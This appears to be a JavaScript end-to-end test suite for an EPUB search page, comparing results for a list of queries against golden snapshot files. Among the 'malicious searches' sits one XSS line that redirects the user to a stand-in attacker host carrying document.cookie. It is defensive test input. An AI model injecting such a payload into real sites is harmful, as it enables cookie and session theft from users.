/* global setup:false suiteSetup:false suite:false test:false */

import fs from 'fs';

import { assert } from 'chai';

import SearchPage from '../pageobjects/search.page';

import {
    clearActualFilesDirectory,
    clearDiffFilesDirectory,
    diffActualVsGoldenAndReturnMessage,
    getActualFilePath,
    getGoldenFilePath,
    getGoldenFiles,
    jsonStableStringify,
    SUITE_NAME,
} from '../util';

const QUERIES = [
    // Keyword searches
    'american government',
    'ancient philosophy',
    'Bérubé',
    'politics',
    'dilemma',
    'education',
    'faith',
    'psychological',
    'ramon lobato',
    'renshon',
    'shapiro',
    'mind',
    'Netflix',
    'show sold separately',
    'law science',

    // Series
    '"Connected Youth"',
    '"connected youth and digital futures"',

    // Numeric, advanced syntax, unusual and/or "bad" or malicious searches
    '"cultural criticism"',
    '*',
    '<script>window.location="http://attacker/?cookie="+document.cookie</script>',
    'and',
    'asdfjklaj#$Q#$^%$&^g fasdlfkn~#%$Q%6546787',
    'e',
    'law and science',
    'law AND science',
    'literature -conflict',
    'politics +community',
    'the',
    'the e g',
];

const goldenFiles = getGoldenFiles( SUITE_NAME.searchResults );

let updateGoldenFiles = false;

if (
    process.env.UPDATE_GOLDEN_FILES &&
    process.env.UPDATE_GOLDEN_FILES.toLowerCase() !== 'false'
) {
    updateGoldenFiles = true;
}

suite( 'Search results', function () {
    suiteSetup( function () {
        clearActualFilesDirectory( SUITE_NAME.searchResults );
        clearDiffFilesDirectory( SUITE_NAME.searchResults );
    } );

    setup( function () {
        SearchPage.open();
    } );

    goldenFiles.forEach( ( goldenFile ) => {
        let golden = require( goldenFile );

        testSearchResults( golden );
    } );
} );

function testSearchResults( golden ) {
    const query          = golden.query;

    const testTitle = `Search for '${ query }' produces correct `              +
                      ' search results header and EPUBs list with thumbnails ' +
                      ' and metadata';

    test( testTitle, function () {
        SearchPage.searchAndWaitForResults( query );

        const snapshot = SearchPage.searchResultsSnapshot();
        const searchId = SearchPage.getSearchIdForCurrentSearch();

        const stringifiedGolden = jsonStableStringify( golden );
        const stringifiedSnapshot = jsonStableStringify( snapshot );

        const actualFile = getActualFilePath( SUITE_NAME.searchResults, searchId );
        const goldenFile = getGoldenFilePath( SUITE_NAME.searchResults, searchId );

        if ( updateGoldenFiles ) {
            fs.writeFileSync( goldenFile, stringifiedSnapshot );

            console.log( `Updated golden file ${ goldenFile }` );

            return;
        }

        fs.writeFileSync( actualFile, stringifiedSnapshot );

        const ok = ( stringifiedSnapshot === stringifiedGolden );
        let message;
        if ( ! ok ) {
            message = diffActualVsGoldenAndReturnMessage( SUITE_NAME.searchResults, actualFile, goldenFile, searchId );
        }

        assert( ok, message );
    } );
}
